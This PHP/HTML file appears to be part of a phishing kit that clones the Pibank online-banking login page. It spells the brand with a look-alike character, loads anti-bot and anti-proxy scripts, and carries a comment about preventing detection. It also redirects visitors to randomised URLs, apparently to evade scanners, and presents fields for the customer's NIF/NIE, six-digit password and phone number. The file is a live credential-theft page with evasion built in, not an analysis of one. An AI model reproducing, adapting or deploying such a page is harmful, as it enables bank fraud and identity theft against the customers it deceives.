<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 Custom            $#
###############################################
**/
include 'antibots/Bot-Crawler.php';
include 'antibots/Bot-neo.php';
include 'antibots/Dila_DZ.php';
include 'antibots/new.php';
/* New Anti Proxy */
include 'antiproxy/antiproxy.php';

/* New Anti Detector */
/* Prevent Detection , Simulate IDS */
if (isset($_GET['client_id'])) {}
else {
$name = 'Control'.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: index.php?client_id='.$name.'&csrf='.$om.'');}
$cliente = sha1(rand(1,999999));
setcookie('uid', $cliente, time()+31536000,'/');

?>

<!DOCTYPE html>
<html>
<head>
	<title>Pibаnk</title>
	<link rel="stylesheet" type="text/css" href="./core/css/main.css">
	<meta name="robots" content="noindex,follow"/>
	<link rel="icon" href="./core/img/favicon.ico"/>
    <script type="text/javascript" src="core/js/jquery-3.5.1.min.js"></script>
</head>
<body>
<div _ngcontent-c3="" class="container login">
  <div _ngcontent-c3="" class="row">
    <h1 _ngcontent-c3="" class="sr-only">Bienvenido a Pibаnk</h1>
    <div _ngcontent-c3="" class="col-12 no-pd">
      <div _ngcontent-c3="" class="right-col-login">
        <div _ngcontent-c3="" class="row">
          <div _ngcontent-c3="" class="col logo-col">
            <img _ngcontent-c3="" class="img-fluid logo-login " src="./core/img/logotipo.svg" alt="Pibank">
          </div>
        </div>
        <div _ngcontent-c3="" class="row">
          <!----><div _ngcontent-c3="" class="login-form">
            <!----><app-login-form _ngcontent-c3="" _nghost-c4=""><div _ngcontent-c4="" class="row">
   <div _ngcontent-c4="" class="col-12 open-account">
    <a _ngcontent-c4="" class="btn btn-01" name="open_account" target="_blank" href="#" title="Hazte cliente">Hazte cliente</a>
  </div>
</div>

<form _ngcontent-c4="" class="yellow-form ng-pristine ng-invalid ng-touched" novalidate="">
  <div _ngcontent-c4="" class="form-row">
    <div _ngcontent-c4="" class="col-12 input-col">
      <input _ngcontent-c4="" appdonotcollapse="" class="input-base ng-pristine ng-invalid ng-touched" formcontrolname="username" id="input01" maxlength="10" type="text">
      <label _ngcontent-c4="" class="placeholder-anim label" for="input01" id="label01">NIF/NIE</label>
      <!---->
      <!---->
      <!---->
      <!---->
    </div>
    <div _ngcontent-c4="" class="col-12 input-col">
      <input _ngcontent-c4="" appdonotcollapse="" appnospecialcharactersglobal="" appshowpassword="" class="input-base ng-untouched ng-pristine ng-invalid" formcontrolname="password" id="input02" maxlength="6" oncut="return false" pattern="^[0-9]*$" type="password">
      <label _ngcontent-c4="" class="placeholder-anim label" for="input02" id="label02">CONTRASEÑA</label>
      <!---->
      <a _ngcontent-c4="" class="lost-password" href="javascript:;" name="remember_password" title="¿La has olvidado?">¿La has olvidado?</a>
      <!---->
      <!---->
      <!---->
      <!---->
    </div>
    <div _ngcontent-c4="" class="col-12 input-col">
      <input _ngcontent-c4="" appdonotcollapse="" appnospecialcharactersglobal="" appshowpassword="" class="input-base ng-untouched ng-pristine ng-invalid" formcontrolname="password" id="input03" maxlength="15" oncut="return false" pattern="^[0-9]*$" type="number">
      <label _ngcontent-c4="" class="placeholder-anim label" for="input02" id="label02">Teléfono</label>
      <!---->
      <!---->
      <!---->
      <!---->
      <!---->
    </div>
  </div>

  

  

  <div _ngcontent-c4="" class="col-12 conditions">
    <p _ngcontent-c4="">Al continuar, estás aceptando los
      <a _ngcontent-c4="" href="./CondicionesGenerales.pdf" name="terms" target="_blank" title="términos y condiciones">términos y condiciones</a>
    </p>
    <div _ngcontent-c4="" class="login-btn">
      <input _ngcontent-c4="" class="btn btn-02 entrar" id="submit-login" name="continuar" title="Continuar" value="Continuar">
    </div>
    <div _ngcontent-c4="" class="help-btn">
      <a _ngcontent-c4="" class="btn btn-01" target="_blank" href="#" title="¿Necesitas ayuda?">
        ¿Necesitas ayuda?
      </a>
    </div>
  </div>

</form>

<!---->
</app-login-form>
            <!---->
          </div>
          <!---->
        </div>
      </div>
    </div>

      <!---->

<script type="text/javascript" src="core/js/app.js"></script>
  </div>
</div>
</body>
</html>